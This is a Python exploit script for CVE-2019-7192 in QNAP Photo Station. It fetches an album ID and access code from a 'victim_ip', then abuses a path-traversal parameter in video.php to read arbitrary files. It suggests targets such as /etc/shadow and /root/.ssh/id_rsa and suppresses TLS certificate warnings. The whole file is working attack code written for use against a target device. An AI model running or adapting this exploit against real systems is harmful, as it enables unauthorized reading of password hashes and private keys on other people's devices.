#!/usr/bin/python3

import requests
import re
import sys

# hide ssl error
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green


def QNAP_CVE_2019_7192(victim_ip):
    try:
        # perform RCE and check if payload sent successfully
        exploit_result = file_disclosure(victim_ip)
        if exploit_result:
            print(G+'QNAP_CVE_2019_7192 exploit successful!'+W)
            return 'QNAP_CVE_2019_7192 exploit successful!'
        else:
            print(R+'QNAP_CVE_2019_7192 exploit failed!'+W)
            return 'QNAP_CVE_2019_7192 exploit failed!'
    except KeyboardInterrupt:
        print('\n' + 'Program exiting...')
        sys.exit()


def file_disclosure(victim_ip):
    url = 'http://' + victim_ip + ':8080'
    req = requests.Session()
    post_data = {'a': 'setSlideshow', 'f': 'qsamplealbum'}
    album_id_response = req.post(
        url + "/photo/p/api/album.php", data=post_data, verify=False, timeout=10)

    # if no album id
    if album_id_response.status_code != 200:
        print(R+"Album ID not found! Not vulnerable!"+W)
        return False

    album_id = re.search('(?<=<output>).*?(?=</output>)',
                         album_id_response.text).group()

    access_code_response = req.get(
        url + "/photo/slideshow.php?album=" + album_id, verify=False, timeout=10)

    # if no access code
    if access_code_response.status_code != 200:
        print(R+"Access code not found! Not vulnerable!"+W)
        return False

    access_code = re.search(
        "(?<=encodeURIComponent\\(').*?(?=')", access_code_response.text).group()

    # ask for file to read
    print("Possible interesting files:")
    print("/etc/passwd")
    print("/etc/shadow")
    print("/etc/hostname")
    print("/root/.ssh/id_rsa")
    file_to_read = input("Enter the file to read: ")
    file_to_read_traversed = "./../../../../.." + file_to_read

    post_data = {'album': album_id, 'a': 'caption',
                 'ac': access_code, 'f': 'UMGObv', 'filename': file_to_read_traversed}
    file_read_response = req.post(
        url + "/photo/p/api/video.php", data=post_data, verify=False, timeout=10)

    print()
    print(file_to_read + " file content:")
    print(file_read_response.text)
    return True
